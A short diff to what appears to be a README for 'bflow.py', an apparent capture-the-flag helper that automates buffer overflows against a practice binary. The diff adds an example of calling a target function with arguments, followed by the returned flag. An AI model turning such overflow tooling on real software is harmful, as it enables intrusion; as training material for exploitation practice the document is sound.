@@ -21,3 +21,10 @@ $ python bflow.py ./vuln win
 [.] Parsing corefile...
 flag{y0u_0v3rfl0w3d_th3_buff3r}
 ```
+
+Overflowing a function that requires arguments:
+
+```bash
+$ python bflow.py ./vuln win -a 0xDEADBEEF 0xCAFEBABE
+flag{y0u_0v3rfl0w3d_th3_buff3r_ag2in}
+```
